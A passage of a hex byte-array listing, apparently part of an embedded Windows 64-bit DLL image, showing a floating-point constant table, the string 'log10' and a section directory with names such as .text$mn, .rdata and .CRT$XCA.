0x30, 0x8d, 0x1, 0xd3, 0xf8, 0x3f, 0x3a, 0xff, 0x62, 0x80, 0xce, 0xbf, 0xf8, 0x3f, 0xaa, 0xf3, 0x6b, 0xf, 0xb9, 0xac, 0xf8, 0x3f, 0x9c, 0x89, 0x1, 0xf6, 0xc0, 0x99, 0xf8, 0x3f, 0x4a, 0xb0, 0xab, 0xf0, 0xe5, 0x86, 0xf8, 0x3f, 0xb9, 0x92, 0xc0, 0xbc, 0x27, 0x74, 0xf8, 0x3f, 0x18, 0x86, 0x61, 0x18, 0x86, 0x61, 0xf8, 0x3f, 0x14, 0x6, 0x78, 0xc2, 0x0, 0x4f, 0xf8, 0x3f, 0xdd, 0xbe, 0xb2, 0x7a, 0x97, 0x3c, 0xf8, 0x3f, 0xa0, 0xa4, 0x82, 0x1, 0x4a, 0x2a, 0xf8, 0x3f, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0xf8, 0x3f, 0x6, 0x18, 0x60, 0x80, 0x1, 0x6, 0xf8, 0x3f, 0x40, 0x7f, 0x1, 0xfd, 0x5, 0xf4, 0xf7, 0x3f, 0x1d, 0x4f, 0x5a, 0x51, 0x25, 0xe2, 0xf7, 0x3f, 0xf4, 0x5, 0x7d, 0x41, 0x5f, 0xd0, 0xf7, 0x3f, 0x7c, 0x1, 0x2e, 0x92, 0xb3, 0xbe, 0xf7, 0x3f, 0xc3, 0xec, 0xe0, 0x8, 0x22, 0xad, 0xf7, 0x3f, 0x8b, 0x39, 0xb6, 0x6b, 0xaa, 0x9b, 0xf7, 0x3f, 0xc8, 0xa4, 0x78, 0x81, 0x4c, 0x8a, 0xf7, 0x3f, 0xd, 0xc6, 0x9a, 0x11, 0x8, 0x79, 0xf7, 0x3f, 0xb1, 0xa9, 0x34, 0xe4, 0xdc, 0x67, 0xf7, 0x3f, 0x6d, 0x75, 0x1, 0xc2, 0xca, 0x56, 0xf7, 0x3f, 0x46, 0x17, 0x5d, 0x74, 0xd1, 0x45, 0xf7, 0x3f, 0x8d, 0xfe, 0x41, 0xc5, 0xf0, 0x34, 0xf7, 0x3f, 0xbc, 0xde, 0x46, 0x7f, 0x28, 0x24, 0xf7, 0x3f, 0x9, 0x7c, 0x9c, 0x6d, 0x78, 0x13, 0xf7, 0x3f, 0x70, 0x81, 0xb, 0x5c, 0xe0, 0x2, 0xf7, 0x3f, 0x17, 0x60, 0xf2, 0x16, 0x60, 0xf2, 0xf6, 0x3f, 0xc7, 0x37, 0x43, 0x6b, 0xf7, 0xe1, 0xf6, 0x3f, 0x61, 0xc8, 0x81, 0x26, 0xa6, 0xd1, 0xf6, 0x3f, 0x17, 0x6c, 0xc1, 0x16, 0x6c, 0xc1, 0xf6, 0x3f, 0x3d, 0x1a, 0xa3, 0xa, 0x49, 0xb1, 0xf6, 0x3f, 0x90, 0x72, 0x53, 0xd1, 0x3c, 0xa1, 0xf6, 0x3f, 0xc0, 0xd0, 0x88, 0x3a, 0x47, 0x91, 0xf6, 0x3f, 0x17, 0x68, 0x81, 0x16, 0x68, 0x81, 0xf6, 0x3f, 0x1a, 0x67, 0x1, 0x36, 0x9f, 0x71, 0xf6, 0x3f, 0xf9, 0x22, 0x51, 0x6a, 0xec, 0x61, 0xf6, 0x3f, 0xa3, 0x4a, 0x3b, 0x85, 0x4f, 0x52, 0xf6, 0x3f, 0x64, 0x21, 0xb, 0x59, 0xc8, 0x42, 0xf6, 0x3f, 0xde, 0xc0, 0x8a, 0xb8, 0x56, 0x33, 0xf6, 0x3f, 0x40, 0x62, 0x1, 0x77, 0xfa, 0x23, 0xf6, 0x3f, 0x94, 0xae, 0x31, 0x68, 0xb3, 0x14, 0xf6, 0x3f, 0x6, 0x16, 0x58, 0x60, 0x81, 0x5, 0xf6, 0x3f, 0xfc, 0x2d, 0x29, 0x34, 0x64, 0xf6, 0xf5, 0x3f, 0xe7, 0x15, 0xd0, 0xb8, 0x5b, 0xe7, 0xf5, 0x3f, 0xa5, 0xe2, 0xec, 0xc3, 0x67, 0xd8, 0xf5, 0x3f, 0x57, 0x10, 0x93, 0x2b, 0x88, 0xc9, 0xf5, 0x3f, 0x91, 0xfa, 0x47, 0xc6, 0xbc, 0xba, 0xf5, 0x3f, 0xc0, 0x5a, 0x1, 0x6b, 0x5, 0xac, 0xf5, 0x3f, 0xaa, 0xcc, 0x23, 0xf1, 0x61, 0x9d, 0xf5, 0x3f, 0xed, 0x58, 0x81, 0x30, 0xd2, 0x8e, 0xf5, 0x3f, 0x60, 0x5, 0x58, 0x1, 0x56, 0x80, 0xf5, 0x3f, 0x3a, 0x6b, 0x50, 0x3c, 0xed, 0x71, 0xf5, 0x3f, 0xe2, 0x52, 0x7c, 0xba, 0x97, 0x63, 0xf5, 0x3f, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0xf5, 0x3f, 0xfe, 0x82, 0xbb, 0xe6, 0x25, 0x47, 0xf5, 0x3f, 0xeb, 0xf, 0xf4, 0x48, 0x9, 0x39, 0xf5, 0x3f, 0x4b, 0x5, 0xa8, 0x56, 0xff, 0x2a, 0xf5, 0x3f, 0x15, 0xf8, 0xe2, 0xea, 0x7, 0x1d, 0xf5, 0x3f, 0xc5, 0xc4, 0x11, 0xe1, 0x22, 0xf, 0xf5, 0x3f, 0x15, 0x50, 0x1, 0x15, 0x50, 0x1, 0xf5, 0x3f, 0x9b, 0x4c, 0xdd, 0x62, 0x8f, 0xf3, 0xf4, 0x3f, 0x39, 0x5, 0x2f, 0xa7, 0xe0, 0xe5, 0xf4, 0x3f, 0x4c, 0x2c, 0xdc, 0xbe, 0x43, 0xd8, 0xf4, 0x3f, 0x6e, 0xaf, 0x25, 0x87, 0xb8, 0xca, 0xf4, 0x3f, 0xe1, 0x8f, 0xa6, 0xdd, 0x3e, 0xbd, 0xf4, 0x3f, 0x5b, 0xbf, 0x52, 0xa0, 0xd6, 0xaf, 0xf4, 0x3f, 0x4a, 0x1, 0x76, 0xad, 0x7f, 0xa2, 0xf4, 0x3f, 0x67, 0xd0, 0xb2, 0xe3, 0x39, 0x95, 0xf4, 0x3f, 0x80, 0x48, 0x1, 0x22, 0x5, 0x88, 0xf4, 0x3f, 0x7b, 0x14, 0xae, 0x47, 0xe1, 0x7a, 0xf4, 0x3f, 0x66, 0x60, 0x59, 0x34, 0xce, 0x6d, 0xf4, 0x3f, 0x9a, 0xcf, 0xf5, 0xc7, 0xcb, 0x60, 0xf4, 0x3f, 0xca, 0x76, 0xc7, 0xe2, 0xd9, 0x53, 0xf4, 0x3f, 0xfb, 0xd9, 0x62, 0x65, 0xf8, 0x46, 0xf4, 0x3f, 0x4d, 0xee, 0xab, 0x30, 0x27, 0x3a, 0xf4, 0x3f, 0x87, 0x1f, 0xd5, 0x25, 0x66, 0x2d, 0xf4, 0x3f, 0x51, 0x59, 0x5e, 0x26, 0xb5, 0x20, 0xf4, 0x3f, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xf4, 0x3f, 0x66, 0x65, 0xe, 0xd1, 0x82, 0x7, 0xf4, 0x3f, 0xfb, 0x13, 0xb0, 0x3f, 0x1, 0xfb, 0xf3, 0x3f, 0x7, 0xaf, 0xa5, 0x42, 0x8f, 0xee, 0xf3, 0x3f, 0x2, 0xa9, 0xe4, 0xbc, 0x2c, 0xe2, 0xf3, 0x3f, 0xc6, 0x75, 0xaa, 0x91, 0xd9, 0xd5, 0xf3, 0x3f, 0xe7, 0xab, 0x7b, 0xa4, 0x95, 0xc9, 0xf3, 0x3f, 0x55, 0x29, 0x23, 0xd9, 0x60, 0xbd, 0xf3, 0x3f, 0x14, 0x3b, 0xb1, 0x13, 0x3b, 0xb1, 0xf3, 0x3f, 0x22, 0xc8, 0x7a, 0x38, 0x24, 0xa5, 0xf3, 0x3f, 0x63, 0x7f, 0x18, 0x2c, 0x1c, 0x99, 0xf3, 0x3f, 0x8e, 0x8, 0x66, 0xd3, 0x22, 0x8d, 0xf3, 0x3f, 0x14, 0x38, 0x81, 0x13, 0x38, 0x81, 0xf3, 0x3f, 0xee, 0x45, 0xc9, 0xd1, 0x5b, 0x75, 0xf3, 0x3f, 0x48, 0x7, 0xde, 0xf3, 0x8d, 0x69, 0xf3, 0x3f, 0xf8, 0x2a, 0x9f, 0x5f, 0xce, 0x5d, 0xf3, 0x3f, 0xc1, 0x78, 0x2b, 0xfb, 0x1c, 0x52, 0xf3, 0x3f, 0x46, 0x13, 0xe0, 0xac, 0x79, 0x46, 0xf3, 0x3f, 0xb2, 0xbc, 0x57, 0x5b, 0xe4, 0x3a, 0xf3, 0x3f, 0xfa, 0x1d, 0x6a, 0xed, 0x5c, 0x2f, 0xf3, 0x3f, 0xbf, 0x10, 0x2b, 0x4a, 0xe3, 0x23, 0xf3, 0x3f, 0xb6, 0xeb, 0xe9, 0x58, 0x77, 0x18, 0xf3, 0x3f, 0x90, 0xd1, 0x30, 0x1, 0x19, 0xd, 0xf3, 0x3f, 0x60, 0x2, 0xc4, 0x2a, 0xc8, 0x1, 0xf3, 0x3f, 0x68, 0x2f, 0xa1, 0xbd, 0x84, 0xf6, 0xf2, 0x3f, 0x4b, 0xd1, 0xfe, 0xa1, 0x4e, 0xeb, 0xf2, 0x3f, 0x97, 0x80, 0x4b, 0xc0, 0x25, 0xe0, 0xf2, 0x3f, 0xa0, 0x50, 0x2d, 0x1, 0xa, 0xd5, 0xf2, 0x3f, 0xa0, 0x2c, 0x81, 0x4d, 0xfb, 0xc9, 0xf2, 0x3f, 0x11, 0x37, 0x5a, 0x8e, 0xf9, 0xbe, 0xf2, 0x3f, 0x40, 0x2b, 0x1, 0xad, 0x4, 0xb4, 0xf2, 0x3f, 0x5, 0xc1, 0xf3, 0x92, 0x1c, 0xa9, 0xf2, 0x3f, 0x9e, 0x12, 0xe4, 0x29, 0x41, 0x9e, 0xf2, 0x3f, 0xa5, 0x4, 0xb8, 0x5b, 0x72, 0x93, 0xf2, 0x3f, 0x13, 0xb0, 0x88, 0x12, 0xb0, 0x88, 0xf2, 0x3f, 0x4d, 0xce, 0xa1, 0x38, 0xfa, 0x7d, 0xf2, 0x3f, 0x35, 0x27, 0x81, 0xb8, 0x50, 0x73, 0xf2, 0x3f, 0x27, 0x1, 0xd6, 0x7c, 0xb3, 0x68, 0xf2, 0x3f, 0xf1, 0x92, 0x80, 0x70, 0x22, 0x5e, 0xf2, 0x3f, 0xb2, 0x77, 0x91, 0x7e, 0x9d, 0x53, 0xf2, 0x3f, 0x92, 0x24, 0x49, 0x92, 0x24, 0x49, 0xf2, 0x3f, 0x5b, 0x60, 0x17, 0x97, 0xb7, 0x3e, 0xf2, 0x3f, 0xdf, 0xbc, 0x9a, 0x78, 0x56, 0x34, 0xf2, 0x3f, 0x2a, 0x12, 0xa0, 0x22, 0x1, 0x2a, 0xf2, 0x3f, 0x78, 0xfb, 0x21, 0x81, 0xb7, 0x1f, 0xf2, 0x3f, 0xe6, 0x55, 0x48, 0x80, 0x79, 0x15, 0xf2, 0x3f, 0xd9, 0xc0, 0x67, 0xc, 0x47, 0xb, 0xf2, 0x3f, 0x12, 0x20, 0x1, 0x12, 0x20, 0x1, 0xf2, 0x3f, 0x70, 0x1f, 0xc1, 0x7d, 0x4, 0xf7, 0xf1, 0x3f, 0x4c, 0xb8, 0x7f, 0x3c, 0xf4, 0xec, 0xf1, 0x3f, 0x74, 0xb8, 0x3f, 0x3b, 0xef, 0xe2, 0xf1, 0x3f, 0xbd, 0x4a, 0x2e, 0x67, 0xf5, 0xd8, 0xf1, 0x3f, 0x1d, 0x81, 0xa2, 0xad, 0x6, 0xcf, 0xf1, 0x3f, 0x59, 0xe0, 0x1c, 0xfc, 0x22, 0xc5, 0xf1, 0x3f, 0x29, 0xed, 0x46, 0x40, 0x4a, 0xbb, 0xf1, 0x3f, 0xe3, 0xba, 0xf2, 0x67, 0x7c, 0xb1, 0xf1, 0x3f, 0x96, 0x7b, 0x1a, 0x61, 0xb9, 0xa7, 0xf1, 0x3f, 0x9e, 0x11, 0xe0, 0x19, 0x1, 0x9e, 0xf1, 0x3f, 0x9c, 0xa2, 0x8c, 0x80, 0x53, 0x94, 0xf1, 0x3f, 0xdb, 0x2b, 0x90, 0x83, 0xb0, 0x8a, 0xf1, 0x3f, 0x12, 0x18, 0x81, 0x11, 0x18, 0x81, 0xf1, 0x3f, 0x84, 0xd6, 0x1b, 0x19, 0x8a, 0x77, 0xf1, 0x3f, 0x79, 0x73, 0x42, 0x89, 0x6, 0x6e, 0xf1, 0x3f, 0x1, 0x32, 0xfc, 0x50, 0x8d, 0x64, 0xf1, 0x3f, 0xd, 0x27, 0x75, 0x5f, 0x1e, 0x5b, 0xf1, 0x3f, 0xc9, 0xd5, 0xfd, 0xa3, 0xb9, 0x51, 0xf1, 0x3f, 0x3b, 0xcd, 0xa, 0xe, 0x5f, 0x48, 0xf1, 0x3f, 0x24, 0x47, 0x34, 0x8d, 0xe, 0x3f, 0xf1, 0x3f, 0x11, 0xc8, 0x35, 0x11, 0xc8, 0x35, 0xf1, 0x3f, 0xac, 0xc0, 0xed, 0x89, 0x8b, 0x2c, 0xf1, 0x3f, 0x33, 0x30, 0x5d, 0xe7, 0x58, 0x23, 0xf1, 0x3f, 0x26, 0x48, 0xa7, 0x19, 0x30, 0x1a, 0xf1, 0x3f, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xf1, 0x3f, 0x80, 0x10, 0x1, 0xbe, 0xfb, 0x7, 0xf1, 0x3f, 0x11, 0xf0, 0xfe, 0x10, 0xf0, 0xfe, 0xf0, 0x3f, 0xa2, 0x25, 0xb3, 0xfa, 0xed, 0xf5, 0xf0, 0x3f, 0x90, 0x9c, 0xe6, 0x6b, 0xf5, 0xec, 0xf0, 0x3f, 0x11, 0x60, 0x82, 0x55, 0x6, 0xe4, 0xf0, 0x3f, 0x96, 0x46, 0x8f, 0xa8, 0x20, 0xdb, 0xf0, 0x3f, 0x3a, 0x9e, 0x35, 0x56, 0x44, 0xd2, 0xf0, 0x3f, 0x3b, 0xda, 0xbc, 0x4f, 0x71, 0xc9, 0xf0, 0x3f, 0x71, 0x41, 0x8b, 0x86, 0xa7, 0xc0, 0xf0, 0x3f, 0xc8, 0x9d, 0x25, 0xec, 0xe6, 0xb7, 0xf0, 0x3f, 0xb5, 0xec, 0x2e, 0x72, 0x2f, 0xaf, 0xf0, 0x3f, 0xa7, 0x10, 0x68, 0xa, 0x81, 0xa6, 0xf0, 0x3f, 0x60, 0x83, 0xaf, 0xa6, 0xdb, 0x9d, 0xf0, 0x3f, 0x54, 0x9, 0x1, 0x39, 0x3f, 0x95, 0xf0, 0x3f, 0xe2, 0x65, 0x75, 0xb3, 0xab, 0x8c, 0xf0, 0x3f, 0x84, 0x10, 0x42, 0x8, 0x21, 0x84, 0xf0, 0x3f, 0xe2, 0xea, 0xb8, 0x29, 0x9f, 0x7b, 0xf0, 0x3f, 0xc6, 0xf7, 0x47, 0xa, 0x26, 0x73, 0xf0, 0x3f, 0xfb, 0x12, 0x79, 0x9c, 0xb5, 0x6a, 0xf0, 0x3f, 0xfc, 0xa9, 0xf1, 0xd2, 0x4d, 0x62, 0xf0, 0x3f, 0x86, 0x75, 0x72, 0xa0, 0xee, 0x59, 0xf0, 0x3f, 0x4, 0x34, 0xd7, 0xf7, 0x97, 0x51, 0xf0, 0x3f, 0xc5, 0x64, 0x16, 0xcc, 0x49, 0x49, 0xf0, 0x3f, 0x10, 0x4, 0x41, 0x10, 0x4, 0x41, 0xf0, 0x3f, 0xfc, 0x47, 0x82, 0xb7, 0xc6, 0x38, 0xf0, 0x3f, 0x1a, 0x5e, 0x1f, 0xb5, 0x91, 0x30, 0xf0, 0x3f, 0xe9, 0x29, 0x77, 0xfc, 0x64, 0x28, 0xf0, 0x3f, 0x8, 0x4, 0x2, 0x81, 0x40, 0x20, 0xf0, 0x3f, 0x37, 0x7a, 0x51, 0x36, 0x24, 0x18, 0xf0, 0x3f, 0x10, 0x10, 0x10, 0x10, 0x10, 0x10, 0xf0, 0x3f, 0x80, 0x0, 0x1, 0x2, 0x4, 0x8, 0xf0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf0, 0x3f, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x6c, 0x6f, 0x67, 0x31, 0x30, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x3f, 0x43, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x3f, 0xc3, 0x78, 0x6a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0xf0, 0xde, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0xa7, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x60, 0xa8, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x61, 0xfe, 0xf, 0x67, 0x0, 0x0, 0x0, 0x0, 0xd, 0x0, 0x0, 0x0, 0xc8, 0x2, 0x0, 0x0, 0xc, 0x6b, 0x1, 0x0, 0xc, 0x59, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x38, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x40, 0x91, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb0, 0xf2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc0, 0xf2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xec, 0x6a, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xb8, 0xf2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xc8, 0xf2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0xd0, 0xf2, 0x0, 0x80, 0x1, 0x0, 0x0, 0x0, 0x10, 0x9c, 0x1, 0x80, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x9b, 0x1, 0x0, 0xa8, 0x69, 0x1, 0x0, 0x80, 0x69, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xc0, 0x69, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xd0, 0x69, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x9b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0xa8, 0x69, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x9b, 0x1, 0x0, 0x20, 0x6a, 0x1, 0x0, 0xf8, 0x69, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x2, 0x0, 0x0, 0x0, 0x38, 0x6a, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x50, 0x6a, 0x1, 0x0, 0xd0, 0x69, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x20, 0x9b, 0x1, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x20, 0x6a, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x9b, 0x1, 0x0, 0xa0, 0x6a, 0x1, 0x0, 0x78, 0x6a, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x6a, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xc8, 0x6a, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x70, 0x9b, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0xff, 0xff, 0xff, 0xff, 0x0, 0x0, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0xa0, 0x6a, 0x1, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x2, 0x80, 0x2, 0x80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x4, 0x6b, 0x1, 0x0, 0x8, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0x44, 0x2, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x10, 0x0, 0x0, 0xa0, 0xd4, 0x0, 0x0, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6d, 0x6e, 0x0, 0x0, 0x0, 0x0, 0xa0, 0xe4, 0x0, 0x0, 0x40, 0x0, 0x0, 0x0, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x6d, 0x6e, 0x24, 0x30, 0x30, 0x0, 0xe0, 0xe4, 0x0, 0x0, 0x80, 0x4, 0x0, 0x0, 0x2e, 0x74, 0x65, 0x78, 0x74, 0x24, 0x78, 0x0, 0x0, 0xf0, 0x0, 0x0, 0xb0, 0x2, 0x0, 0x0, 0x2e, 0x69, 0x64, 0x61, 0x74, 0x61, 0x24, 0x35, 0x0, 0x0, 0x0, 0x0, 0xb0, 0xf2, 0x0, 0x0, 0x28, 0x0, 0x0, 0x0, 0x2e, 0x30, 0x30, 0x63, 0x66, 0x67, 0x0, 0x0, 0xd8, 0xf2, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x41, 0x0, 0x0, 0x0, 0x0, 0xe0, 0xf2, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x43, 0x5a, 0x0, 0x0, 0x0, 0x0, 0xe8, 0xf2, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x41, 0x0, 0x0, 0x0, 0x0, 0xf0, 0xf2, 0x0, 0x0, 0x18, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x43, 0x0, 0x0, 0x0, 0x0, 0x8, 0xf3, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x49, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x10, 0xf3, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x41, 0x0, 0x0, 0x0, 0x0, 0x18, 0xf3, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x58, 0x0, 0x0, 0x0, 0x0, 0x28, 0xf3, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x58, 0x41, 0x0, 0x0, 0x0, 0x30, 0xf3, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x50, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x38, 0xf3, 0x0, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x41, 0x0, 0x0, 0x0, 0x0, 0x40, 0xf3, 0x0, 0x0, 0x10, 0x0, 0x0, 0x0, 0x2e, 0x43, 0x52, 0x54, 0x24, 0x58, 0x54, 0x5a, 0x0, 0x0, 0x0, 0x0, 0x50, 0xf3, 0x0, 0x0, 0x30, 0x76, 0x0, 0x0, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x0, 0x0, 0x80, 0x69, 0x1, 0x0, 0x6c, 0x1, 0x0, 0x0, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x72, 0x0, 0x0, 0x0, 0x0, 0xec, 0x6a, 0x1, 0x0, 0x20, 0x0, 0x0, 0x0, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x76, 0x6f, 0x6c, 0x74, 0x6d, 0x64, 0x0, 0x0, 0x0, 0xc, 0x6b, 0x1, 0x0, 0xcc, 0x2, 0x0, 0x0, 0x2e, 0x72, 0x64, 0x61, 0x74, 0x61, 0x24, 0x7a, 0x7a, 0x7a, 0x64, 0x62, 0x67, 0x0, 0x0, 0x0, 0xd8, 0x6d, 0x1, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x72, 0x74, 0x63, 0x24, 0x49, 0x41, 0x41, 0x0, 0x0, 0x0, 0x0, 0xe0, 0x6d, 0x1, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x72, 0x74, 0x63, 0x24, 0x49, 0x5a, 0x5a, 0x0, 0x0, 0x0, 0x0, 0xe8, 0x6d, 0x1, 0x0, 0x8, 0x0, 0x0, 0x0, 0x2e, 0x72, 0x74, 0x63, 0x24, 0x54, 0x41, 